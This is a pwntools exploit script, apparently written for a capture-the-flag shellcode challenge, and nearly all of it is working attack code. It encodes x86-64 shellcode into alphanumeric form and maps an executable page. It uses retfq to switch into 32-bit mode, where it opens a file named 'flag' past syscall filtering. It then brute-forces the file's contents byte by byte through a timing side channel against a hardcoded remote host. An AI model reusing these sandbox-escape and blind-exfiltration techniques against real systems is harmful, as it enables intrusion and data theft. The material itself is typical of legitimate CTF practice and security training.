# encoding:utf-8
from pwn import *
from ae64 import AE64
# context.log_level = 'debug'
# context.terminal = ['tmux','sp','-h']

file = context.binary = './shellcode'
obj = AE64()

append_x86 = '''
push ebx
pop ebx
'''
shellcode_x86 = '''
/*fp = open("flag")*/
mov esp,0x40404140
push 0x67616c66
push esp
pop ebx
xor ecx,ecx
mov eax,5
int 0x80
mov ecx,eax
 
/* read(fp,buf,0x70) */
/*mov eax,3*/
/*push 0x70*/
/*push ebx*/
/*push 3*/
/*int 0x80*/
'''
shellcode_flag = '''
push 0x33
push 0x40404089
retfq
/*read(fp,buf,0x70)*/
mov rdi,rcx
mov rsi,rsp
mov rdx,0x70
xor rax,rax
syscall


'''
shellcode_x86 = asm(shellcode_x86,arch = 'i386',os = 'linux',bits='32')
shellcode_flag = asm(shellcode_flag,arch = 'amd64',os = 'linux')
shellcode = ''
append = '''
push rdx
pop rdx
'''
# 0x40404040 为32位shellcode地址
shellcode_mmap = '''
/*mmap(0x40404040,0x7e,7,34,0,0)*/
push 0x40404040 /*set rdi*/
pop rdi

push 0x7e /*set rsi*/
pop rsi

push 0x40 /*set rdx*/
pop rax
xor al,0x47
push rax
pop rdx

push 0x40 /*set r8*/
pop rax
xor al,0x40
push rax
pop r8

push rax /*set r9*/
pop r9

/*syscall*/
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x31],cl
push 0x5f
pop rcx
xor byte ptr[rax+0x32],cl

push 0x22 /*set rcx*/
/*pop rcx*/
pop r10

push 0x40/*set rax*/
pop rax
xor al,0x49
syscall
'''
shellcode_read = '''
/*read(0,0x40404040,0x70)*/
push 0x40404040
pop rsi
push 0x40
pop rax
xor al,0x40
push rax
pop rdi
xor al,0x40
push 0x70
pop rdx
push rbx
pop rax
push 0x5d
pop rcx
xor byte ptr[rax+0x57],cl
push 0x5f
pop rcx
xor byte ptr[rax+0x58],cl
push rdx
pop rax
xor al,0x70
syscall
'''

shellcode_retfq = '''
push rbx
pop rax

xor al,0x40

push 0x72
pop rcx
xor byte ptr[rax+0x40],cl
push 0x68
pop rcx
xor byte ptr[rax+0x40],cl
push 0x47
pop rcx
sub byte ptr[rax+0x41],cl
push 0x48
pop rcx
sub byte ptr[rax+0x41],cl
push rdi
push rdi
push 0x23
push 0x40404040
pop rax
push rax
retfq
'''

shellcode = ''
shellcode += shellcode_mmap
shellcode += append
shellcode += shellcode_read
shellcode += append

shellcode += shellcode_retfq
shellcode += append

sc = obj.encode(asm(shellcode),'rbx')
#p=process(file)

# gdb.attach(p,"b *0x40026D")
# gdb.attach(p,"b *0x7ffff7ff9102")
# raw_input()

# p.send(sc)
# pause()
# p.sendline(shellcode_x86 + 0x29*'\x90' + shellcode_flag)
# print p.recv()
# p.interactive()


def pwn(p, index, ch):
        #gdb.attach(p,"b *0x40026D")
	#pause()
	p.send(sc)

	shellcode=''
	if index == 0:
		shellcode += "cmp byte ptr[rsi+{0}], {1}; jz $-3; ret".format(index, ch)
	else:
		shellcode += "cmp byte ptr[rsi+{0}], {1}; jz $-4; ret".format(index, ch)
	p.sendline(shellcode_x86 + 0x29*'\x90'+ shellcode_flag + asm(shellcode))
	#print p.recv()
	#p.interactive()
index = 0
a = []

while True:
    for ch in range(20, 127):
        p = remote('39.105.137.118','50050')
        # p=process(file)
        pwn(p, index, ch)
        start = time.time()
        try:
            p.recv(timeout=2)
        except:
            pass
        end = time.time()
        p.close()
        if end-start > 1.5:
            a.append(ch)
            print("".join([chr(i) for i in a]))
            break
    else:
        print("".join([chr(i) for i in a]))
        break
    index = index + 1

print("".join([chr(i) for i in a]))

